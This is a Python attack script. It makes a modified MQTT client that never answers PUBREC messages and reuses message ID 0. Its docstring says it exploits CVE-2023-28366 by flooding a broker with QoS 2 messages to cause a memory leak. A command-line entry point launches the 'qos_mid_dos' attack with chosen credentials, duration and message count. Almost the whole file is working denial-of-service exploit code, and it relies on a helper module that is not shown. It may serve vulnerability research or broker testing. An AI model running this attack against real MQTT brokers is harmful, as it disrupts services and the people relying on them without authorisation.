import random

import paho.mqtt.client as mqtt
import argparse
import mqtt_utilities as util
import time


class PoisonedClient1(mqtt.Client):
    """Python class implementing a poisoned MQTT client to implement the attack"""

    def _handle_pubrec(self) -> mqtt.MQTTErrorCode:
        pass

    def _mid_generate(self) -> int:
        return 0


def main(username, password, duration=10.0, number=100.0):
    """In Quality of Service 2 and duplicate Message ID attack we exploit CVE-2023-28366 and send many messages with the described properties without responding to PUBREC commands to cause a memory leak"""""
    reconnect_delay = 10
    connection = util.Connection_status()
    start_time = time.time()
    while True:

        client_p = PoisonedClient1(mqtt.CallbackAPIVersion.VERSION2, userdata={"connection": connection},
                                   protocol=mqtt.MQTTv311)
        client_p.username_pw_set(username, password)
        client_p.on_connect = util.on_connect
        client_p.on_disconnect = util.on_disconnect
        client_p.on_publish = util.on_publish
        topics = util.get_accessible_topics(username)
        interval = duration / number
        if util.connect_client(client_p, connection, reconnect_delay):
            for i in range(number):
                client_p.publish(topics[random.randint(0, len(topics)-1)], "whatever", qos=2)
                time.sleep(interval*random.random())
            return
        else:
            print(f"Resetting client and retrying connection in {reconnect_delay} seconds...", flush=True)
            time.sleep(reconnect_delay)
        elapsed_time = time.time() - start_time
        print("Execution time: " + str(elapsed_time))
        if elapsed_time >= duration:
            print("Time elapsed")
            return


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="launch an qos_mid_dos attack from the local machine")
    parser.add_argument("-d", "--duration", type=int, help="duration in seconds")
    parser.add_argument("-u", "--username", type=str, help="username to connect as")
    parser.add_argument("-p", "--password", type=str, help="password to connect with")
    parser.add_argument("-n", "--number", type=int, help="number of messages to send")
    args = parser.parse_args()
    main(args.username, args.password, args.duration, args.number)
